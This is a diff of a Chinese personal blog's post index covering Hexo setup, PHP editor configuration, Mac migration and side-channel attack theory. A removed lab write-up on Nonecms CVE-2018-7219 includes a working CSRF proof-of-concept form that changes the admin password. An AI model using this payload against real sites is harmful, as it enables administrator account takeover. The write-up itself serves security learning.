-<p>提交之后网页可能打不开，这是因为代码仓库中少了一个名为CNAME的文件，手动添加一个文件再刷新几次就能打开了。（必须为命名为 ‘CNAME’，内容为你的网站域名,如：xinkjung.github.io）</p>
-<p>为了避免此类现象，一些非md文件可以把它们放到根目录的source文件夹下，这里的所有文件都会原样复制（除了md文件）到public目录的，由于hexo默认会把所有md文件都转换成html，包括README.md，所有需要每次生成之后、上传之前，手动将README.md复制到public目录，并删除README.html。</p>
-<p>其他参考<br><a href="http://www.cnblogs.com/MuYunyun/p/5927491.html">http://www.cnblogs.com/MuYunyun/p/5927491.html</a><br><a href="http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa">http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa</a></p>
-<blockquote>
-<p>插入图片</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  ![图片说明](./img/图片名.jpg...url)</span><br></pre></td></tr></table></figure>
-
-<p> 图片保存于source文件夹的img目录内，不过这个好像无法显示图片</p>
-<p> 推荐最好上传到仓库里，直接使用网页链接：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github 图片链接格式：(http://github.com/yourname/your-repository/raw/master/images-folder/xxx.png)</span><br><span class="line">要自己设定的：yourname, your-repository, your-folder, xxx.png。    </span><br><span class="line">yourname            --- 你的帐号    </span><br><span class="line">your-respository    --- 你的 project 名    </span><br><span class="line">images-folder       --- 你存放图片的文件夹，如果是直接放在 project 的项目根目录的話，就可以省略這個    </span><br><span class="line">xxx.png             --- 你的图片名</span><br></pre></td></tr></table></figure>
-
-<p>然后在**.md文件里添加，例如：我的存在于项目Photos根目录下<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG" alt="hhh"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![hhh](https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG)</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>插入超链接</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  [网页链接说明](https://..... url)</span><br></pre></td></tr></table></figure>
-
+<p>这里举两个极端的例子来看看我们为什么要使用 Batch 以及 Batch 对 training 带来了什么样的帮助</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/12.SmallBatchVSLargeBatch.png" alt="Small Batch v.s. Large Batch"></p>
+<p>上图中可以看到，左边是不使用 Batch 即 Full batch 的情况，右边是 Batch size 为1的情况，可以得到结果：左边的蓄力很长时间但效果很好，右边的每次时间很短但可能不太准确。<span class="label info"> Tips：对比大招和一技能的区别</span></p>
+<hr>
+<p>就结束蛮突然的… 后续… …</p>
 ]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>Blog</tag>
-        <tag>GitHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
-    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
-    <content><![CDATA[<p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
-<span id="more"></span>
-
-
-<p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
-<p>以修改管理员密码为例，来说明漏洞详情：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
-<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
-<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
-<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
-<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
-<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
-<h4> 参考链接</h4>
-
-<p><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>CSRF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Sublime text3配置PHP</title>
-    <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
-    <content><![CDATA[<h4 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h4><blockquote>
-<p>准备</p>
-</blockquote>
-<ul>
-<li>Sublime text 3: 可以直接到<a href="http://www.sublimetext.com/">Sublime text3官网</a>下载适合自己电脑的版本安装即可</li>
-<li>PHP: 也是到<a href="http://www.phpstudy.net/">phpstudy官网</a>下载安装即可</li>
-</ul>
-<span id="more"></span>
-
-<blockquote>
-<p>PHP安装</p>
-</blockquote>
-<p>下面进行PHP 环境变量 配置:</p>
-<p>安装好phpstudy后，进入其根目录，找到php这个文件夹会发现里面有各种版本的php，随便选择一个版本你使用就 。</p>
-<p>右键我的电脑-&gt;属性-高级系统设置-&gt;高级。找到环境变量，点击</p>
-<ol>
-<li>编辑用户变量的Path，添加你刚刚选择php版本的路径，保存</li>
-<li>编辑系统变量的Path，也是一样的做法，添加php存储 并保存</li>
-</ol>
-<p><img src="https://github.com/xinkjung/Photos/raw/master/yhpath.jpg" alt="用户"><br><img src="https://github.com/xinkjung/Photos/raw/master/xtpath.jpg" alt="系统"></p>
-<p>然后”win+R”输入cmd，进入命令提示符窗口，输入php -v ，会显示你的php版本信息，就表示配置完成了哦！！<br>（输入php -h命令也会显示相关信息）<br><img src="https://github.com/xinkjung/Photos/raw/master/php-v.jpg" alt="cmd"></p>
-<blockquote>
-<p>sublime text3配置PHP编译系统</p>
-</blockquote>
-<p>打开软件，菜单栏找到Tools-&gt;Build System-&gt;New Build System.<br>这时会弹出如下文件显示代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;shell_cmd&quot;: &quot;make&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>修改代码为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;     </span><br><span class="line">	 &quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;], </span><br><span class="line">     &quot;file_regex&quot;: &quot;php$&quot;,</span><br><span class="line">     &quot;selector&quot;: &quot;source.php&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后保存在默认路径下，并修改文件名为php.sublime-build，到此就OK啦！！！<br>重启sublime text3，随便输入php代码，再按”ctrl+B”就可以编译了。</p>
-<p><img src="https://github.com/xinkjung/Photos/raw/master/helloworld.jpg" alt="php-hw"><br><img src="https://github.com/xinkjung/Photos/raw/master/hw-result.jpg" alt="php-result"></p>
-<h4 id="Sublime-text3配置浏览器预览"><a href="#Sublime-text3配置浏览器预览" class="headerlink" title="Sublime text3配置浏览器预览"></a>Sublime text3配置浏览器预览</h4><blockquote>
-<p>准备</p>
-</blockquote>
-<ul>
-<li>SideBarEnhancements插件： 这是一款侧边栏增强插件，<br>“ctrl+shift+p”打开快速菜单栏，输入”pcip”，选择”install packages”回车，在搜索框内查找该插件并下载。</li>
-</ul>
-<blockquote>
-<p>配置相关文件</p>
-</blockquote>
-<p>  首先为插件指定默认浏览器，打开 “ Preference -&gt; Package Settings -&gt; Side Bar -&gt; Settings-User”,在打开的文件中输入以下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">  &quot;default_browser&quot;: &quot;firefox&quot; //one of this list: firefox, aurora, chrome, canary, chromium, opera, safari</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>默认浏览器可以是列表任一，我选用的是火狐Firefox</p>
-<p>然后为插件指定默认localhost目录，在侧边栏任意文档上右键，选择”Project -&gt; Edit Preview URLs”,在文件中添加：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;F:/PHP/text/&quot;:&#123;</span><br><span class="line">        &quot;url_testing&quot;: &quot;http://localhost:81/&quot;,</span><br><span class="line">        &quot;url_production&quot;: &quot;http://xinkjung.com/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p> 1.”F:/PHP/text/“： 是文件在磁盘中的路径</p>
-<p> 2.”url_testing”: 本地localhost路径，请根据个人情况修改</p>
-<p> 3.”url_production”：项目线上地址（好像可以随便填）</p>
-<p> 接下来最后一步，为浏览器绑定热键，打开”Preference -&gt; Package Settings -&gt; Side Bar -&gt; key Bindings-User”，在打开的文件中添加以下内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;keys&quot;: [&quot;ctrl++shift+f1&quot;],</span><br><span class="line">        &quot;command&quot;: &quot;side_bar_open_in_browser&quot;,</span><br><span class="line">        &quot;args&quot;: &#123;</span><br><span class="line">                    &quot;paths&quot;: [],</span><br><span class="line">                    &quot;type&quot;: &quot;testing&quot;,</span><br><span class="line">                    &quot;browser&quot;: &quot;firefox&quot;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-<p>我使用的是”ctrl+shift+f1”，可视个人习惯而定，浏览器我选用Firefox。</p>
-<p>到此，所有就设置好啦，在页面中按相应热键，选择文件就能在设置的浏览器中浏览啦！！！</p>
-<ul>
-<li>注：一定要打开phpstudy,且文件放置在WWW目录下才可实现哦~</li>
-</ul>
-<p>附上参考链接：<br>1、<a href="https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html">https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html</a></p>
-<p>2、<a href="https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html">https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html</a></p>
-]]></content>
-      <categories>
-        <category>配置</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>Sublime text3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows转Mac继续管理GitHub博客</title>
-    <url>/2021/08/24/Windows%E8%BD%ACMac%E7%BB%A7%E7%BB%AD%E7%AE%A1%E7%90%86GitHub%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h2 id="变！"><a href="#变！" class="headerlink" title="变！"></a>变！</h2><p>从 Windwos 换了 Mac，怎么在 Mac 上继续使用 git 在 GitHub 上传自己的项目呢？</p>
-<p>解决方案：</p>
-<ol>
-<li>在 Mac 上下载 git 、 node.js 和 hexo</li>
-<li>在 Mac 上 clone 自己的项目到目录</li>
-</ol>
-<blockquote>
-<p>第一步：下载和安装</p>
-</blockquote>
-<p>这里使用 homebrew 进行安装<br>(1) 安装 homebrew</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(2) 下载 git 和 node.js </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install git</span><br><span class="line">brew install node</span><br><span class="line">npm install hexo g </span><br></pre></td></tr></table></figure>
-
-<p>可以使用 <code>git</code> 或 <code>git -verison</code> 命令来验证 git 版本。</p>
-<p>(3) 初始化 hexo 目录</p>
-<p>新建一个 hexo 目录用于存放博客相关文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir bolg</span><br></pre></td></tr></table></figure>
-
-<p>在博客根目录打开终端窗口，对目录进行初始化操作</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
-
-<p>再用 <code>hexo s</code> 测试是否成功，打开 <code>localhost:4000</code> 即可查看本地预览 </p>
-<blockquote>
-<p>第二步： SSH 配置 git</p>
-</blockquote>
-<p>(1) 设置 <code>username</code> 和 <code>email</code> （github每次commit都会记录他们） </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;登录账号名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱账号&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(2) 先查看本地是否已存在 <code>SSH key</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>
-
-<p>我的新电脑是没有的，直接通过终端命令创建 <code>ssh key</code> ，然后一直回车，输入 <code>用户名 + 密码</code>（ GitHub 登录的），最后会生成一串密钥。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C “邮箱账号&quot;</span><br></pre></td></tr></table></figure>
-
-<p>(3) 登陆 GitHub ，找到 Settings ，点击 SSH AND GPG Keys –&gt; New SSH key ，把刚刚看到的 key 复制粘贴进去，title 随便写</p>
-<figure class="highlight plaintext"><figcaption><span>复制id_rsa.pub</span></figcaption><table><tr><td class="code"><pre><span class="line">cat .ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
-
-<p>保存后，GitHub 会向邮箱发送一个验证链接，记得要登录邮箱进行验证，不然之后会导致部署不成功</p>
-<p>(4) 验证一下，如果出现 <code>hi +用户名</code> 即为成功 ~</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>第三步: clone 项目 / 文件配置转移</p>
-</blockquote>
-<p>把原来的项目复制下来，可以随便添加点东西去测试是否可以上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git  clone https://wxxxx.git</span><br></pre></td></tr></table></figure>
-
-<p>这里我是直接复制原来 Windows 下的博客根目录 hexo 过来的，然后找到该目录下的：<code>_config.yml</code> 、 <code>scaffolds</code> 、 <code>source</code> 、 <code>themes</code> 这四个文件夹，把它们复制到<br>Mac 下的博客根目录 hexo，直接覆盖替换相同的文件文件夹就可以了。</p>
-<h2 id="problems-？"><a href="#problems-？" class="headerlink" title="problems ？"></a>problems ？</h2><h3 id="Mac-终端-shell-类型切换方法"><a href="#Mac-终端-shell-类型切换方法" class="headerlink" title="Mac 终端 shell 类型切换方法"></a>Mac 终端 shell 类型切换方法</h3><p>可以执行命令 <code>echo $SHELL</code>，先查看终端类型：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: /bin/bash</span><br><span class="line">zsh: /bin/zsh</span><br></pre></td></tr></table></figure>
-
-<p>切换到bash，输入命令：<br><code>chsh -s /bin/bash</code></p>
-<p>切换到zsh，输入命令：<br><code>chsh -s /bin/zsh</code></p>
-<p>ps: 注意需要重启终端生效（强制退出后再打开）</p>
-<h3 id="GitHub-网站打不开或访问慢怎么解决"><a href="#GitHub-网站打不开或访问慢怎么解决" class="headerlink" title="GitHub 网站打不开或访问慢怎么解决"></a>GitHub 网站打不开或访问慢怎么解决</h3><p>查询 <code>github.com</code> 的有效IP，可以使用<a href="http://tool.chinaz.com/dns">站长工具</a><br>然后将查询到的 IP 地址复制到自己的 <code>hosts</code> 文件里即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Host Database</span><br><span class="line"># localhost is used to configure the loopback interface</span><br><span class="line"># when the system is booting.  Do not change this entry.</span><br><span class="line">##</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">255.255.255.255	broadcasthost</span><br><span class="line">::1             localhost</span><br><span class="line">203.208.39.104 github.com</span><br><span class="line">13.114.40.48 github.com</span><br><span class="line">52.69.186.44 github.com</span><br></pre></td></tr></table></figure>
-
-<h3 id="Mac如何编辑-hosts-系统文件"><a href="#Mac如何编辑-hosts-系统文件" class="headerlink" title="Mac如何编辑 hosts 系统文件"></a>Mac如何编辑 hosts 系统文件</h3><p><code>前往 -&gt; 前往文件夹 -&gt; （输入）/etc/hosts</code> ，回车找到 <code>hosts</code> 文件，然后打开对其进行编辑会提示没有权限并询问是否复制，点击复制按钮，然后在新的窗口里可以编辑文件，编辑完成后保存窗口显示文件名是未命名的 <code>hosts副本.txt</code> ，我们将名称改为 <code>hosts</code> (记得去除后缀名txt)，然后保存并替换原来的 <code>hosts</code> 文件。</p>
-<h3 id="Mac-的-ssh-文件在哪里"><a href="#Mac-的-ssh-文件在哪里" class="headerlink" title="Mac 的 .ssh 文件在哪里"></a>Mac 的 .ssh 文件在哪里</h3><p>鼠标点击一下桌面回到 🍎 菜单栏， <code>前往 -&gt; 前往文件夹 -&gt; （输入） ~/.ssh</code> 回车即可。<br>即：shift+command+G -&gt; 输入 ~/.ssh</p>
-]]></content>
-      <categories>
-        <category>配置</category>
-      </categories>
-      <tags>
-        <tag>Blog</tag>
-        <tag>Mac</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/07/26/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>侧信道攻击技术学习</title>
-    <url>/2021/08/24/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h2 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h2><p>侧信道攻击(side channel attack 简称SCA)，又称边信道攻击或旁路攻击，密码学中是指绕过对加密算法的繁琐分析，利用密码算法的硬件实现的运算中泄露的信息，如执行时间、功耗、电磁辐射等，结合统计理论快速的破解密码系统。其核心思想是通过加密软件或硬件运行时产生的各种泄漏信息获取密文信息。</p>
-<p>密码芯片在运算过程中会产生多种类型的泄露信息，而传统的密码分析则忽略了这些“细微”的信息对密码系统安全性的影响。这类新发现的物理泄漏信息被研究学者称为旁路信息(side-chalinelLeakage)，与之对应的攻击方法被称为旁路攻击(side-channel Attack)。</p>
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在狭义上讲，边信道攻击特指针对密码算法的非侵入式攻击，通过加密电子设备在运行过程中的边信道信息泄露破解密码算法，狭义的边信道攻击主要包括针对密码算法的计时攻击、能量分析攻击、电磁分析攻击等，这类新型攻击的有效性远高于密码分析的数学方法，因此给密码设备带来了严重的威胁。</p>
-<p>从广义上讲，针对安全设备的侵入式、半侵入式、非侵入式攻击等任何“旁门左道”的攻击方法都属于边信道攻击的范畴。广义上的边信道攻击往往脑洞大开，攻击方式也五花八门，如针对键盘敲击内容的边信道攻击有声音分析攻击、电磁分析攻击、通过WiFi信道状态进行的攻击（WiKey），以及通过内核使用状态和进程信息进行的攻击等。</p>
-<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>要成功对集成电路芯片进行旁路攻击必须满足两条： </p>
-<ul>
-<li>在泄漏的物理信号与处理的数据之间建立联系； </li>
-<li>在信息泄漏模型中处理的数据与芯片中处理的数据之间建立联系。</li>
-</ul>
-<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>密码学中侧信道攻击的理念最早在1996年由Paul Kocher提出，此后成为密码学中一种重要的密钥恢复方法。它通过利用密码设备在运行密码算法时所泄露的电磁、功耗、声音等物理信息来进行密钥恢复。对于一些设计良好的密码算法，侧信道攻击可能是实际中恢复密钥的唯一可行办法。<br>所有的攻击类型都利用了加密/解密系统在进行加密/解密操作时算法逻辑没有被发现缺陷，但是通过物理效应提供了有用的额外信息（这也是称为“旁路”的缘由），而这些物理信息往往包含了密钥、密码、密文等隐密数据。根据借助的介质或攻击者利用信息的种类，侧信道攻击分为多个大类，主要分为时间攻击、功耗分析攻击、电磁辐射攻击、故障注入攻击等。</p>
-<ul>
-<li>故障攻击/注入</li>
-</ul>
-<p>利用错误计算的结果（或考虑篡改设备上的密码系统），观察密码设备的一些错误操作，从错误行为的结果中分析推导出秘密参数。<br>错误可能导致程序或者设计错误（例如 Intel著名的FDIV错误），或者被攻击者诱导的错误（例如，能量故障，时钟故障，温度变化，离子束注入等）。</p>
-<ul>
-<li>计时攻击</li>
-</ul>
-<p>通过分析加密算法的时间执行来推导出密码，是利用密码系统的密钥与运行时间的关系来进行攻击的方法，与其它侧信道攻击相比，这种攻击方法几乎不需要什么特殊设备。<br>每一个逻辑运算在计算机需要时间来执行，根据输入不同，精确测量执行时间，根据执行时间反推出密码。例如：通过设备运算的用时来推断出所使用的运算操作，或者通过对比运算的时间推定数据位于哪个存储设备，或者利用通信的时间差进行数据窃取。</p>
-<ul>
-<li>功耗/能量攻击</li>
-</ul>
-<p>通过分析密码设备的能量消耗这一物理特性来恢复设备内部的秘密信息获得其密钥。<br>功耗攻击是目前最强有力的侧信道攻击手段之一，包括简单功耗分析攻击（SimplePower Analysis attacks,SPA）和差分功耗分析攻击（Differential　Power　Analysis　attacks,DPA），与传统密码分析学相比，这些攻击手段攻击效果显著。</p>
-<ul>
-<li>电磁攻击</li>
-</ul>
-<p>通过高精度电磁探头多次采集目标产品（设备）工作时泄漏电磁辐射的强度变化，经过得当分析的话可解析出这些泄漏的电磁辐射中包含的信息（比如文本、声音、图像等），这种攻击方式除了用于密码学攻击以外也被用于非密码学攻击等窃听行为，如TEMPEST攻击（例如范·埃克窃听、辐射监测）。</p>
-<ul>
-<li>缓存攻击</li>
-</ul>
-<p>通过获取对缓存的访问权而获取缓存内的一些敏感信息，例如攻击者获取云主机物理主机的访问权而获取存储器的访问权。 </p>
-<ul>
-<li>其他</li>
-</ul>
-<p>基于扫描的攻击、光学辐射攻击、基于频率的攻击、组合攻击、声音攻击等。</p>
-<h3 id="能量攻击（功耗分析攻击）"><a href="#能量攻击（功耗分析攻击）" class="headerlink" title="能量攻击（功耗分析攻击）"></a>能量攻击（功耗分析攻击）</h3><p>1999 年，Kocher 等人提出了功耗分析的理念，该攻击方式是非入侵式，在攻击过程中不需要破坏密码设备，通过利用密码芯片执行过程中泄露的功耗信息来获取中间值，从而进行密钥恢复。功耗分析主要包括简单功耗分析(Simple Power Analysis，SPA)、差分功耗分析(Differential Power Analysis，DPA)、相关功耗分析(Correlation Power Analysis，CPA)等。</p>
-<ol>
-<li>简单功耗分析， SPA</li>
-</ol>
-<p>简单功耗分析是利用加密操作实现细节与功耗之间的关系，直接从测量的功耗轨迹获取密钥信息。在执行算法时，电路在不同时期处于不同的状态，比如存取数据、算术或逻辑运算等，假设将电路的运行时间分成对应不同于电路状态的时间段，那么在每个时间段中电路功耗不尽相同。SPA本质上就是从功耗轨迹（对密码设备在运算时的功耗情况进行采样所获取的曲线）上进行猜测，在一个特定时间执行了什么特定指令以及指令中设计的秘密参量。</p>
-<ol start="2">
-<li>差分功耗分析， DPA</li>
-</ol>
-<p>差分功耗分析是功耗分析中比较方便有效的一种，主要是通过利用不同的明文输入所对应的功耗曲线不同，然后结合统计分析和误差修正技术，从大量的功耗曲线中推测出密码算法中与密钥信息具有相关性的中间结果，最终实现对密码算法的破解，与简单功耗分析攻击(SPA)相比具有更高的攻击强度，对密码芯片造成的安全威胁更大。</p>
-<ol start="3">
-<li>相关功耗分析， CPA</li>
-</ol>
-<p>相关功耗分析是采用统计学的方法对模拟功耗和真实功耗进行相关系数计算。该方法首先在加密设备进行数据加密时进行实际功耗信息的测量即真实功耗，而后利用功耗攻击模型对攻击电路进行理论功耗的预测即模拟功耗，再将实测功耗与预测的理论功耗进行计算得出对应的相关系数。在猜测密钥正确的条件下，功耗攻击模型计算出预测的理论功耗与实测功耗具有很大程度上的相关性。根据相关性的大小对猜测密钥的准确率进行判断，相关系数越大，表明此时猜测密钥越接近真实密钥，反之猜测密钥与真实密钥相差越大，当相关系数为最大值时，猜测密钥即为所需的正确密钥。</p>
-<h3 id="差分故障攻击"><a href="#差分故障攻击" class="headerlink" title="差分故障攻击"></a>差分故障攻击</h3><p>差分故障攻击是将故障注入和传统的密码分析方法差分分析结合起来的一种新型侧信道攻击。<br>其核心思想是通过分析密码设备产生的正确密文和故障注入后错误密文之间的关系，从而恢复出算法的原始密钥。</p>
-<p>故障注入就是在某个合适的时间改变密码芯片的工作条件，使得密码芯片运行的中间状态发生改变，进而产生错误的输出或异常的旁路泄漏。根据攻击者侵入密码设备接口和运行环境的程度，可讲故障注入分为非侵入式故障注入、半侵入式故障注入和侵入式故障注入三种。后两种方式是基于存储数据的修改，而不是传输过程故障，所以都需要在物理上接触密码芯片，还需要昂贵的用于剖片处理的设备和化学用品，以及用于注入故障的特殊设备。而非侵入式故障注入则是通过外界干扰的方式，如时钟、电压或磁场等，让密码芯片执行出错，相比于其他两种 方式具有更高的可行性。</p>
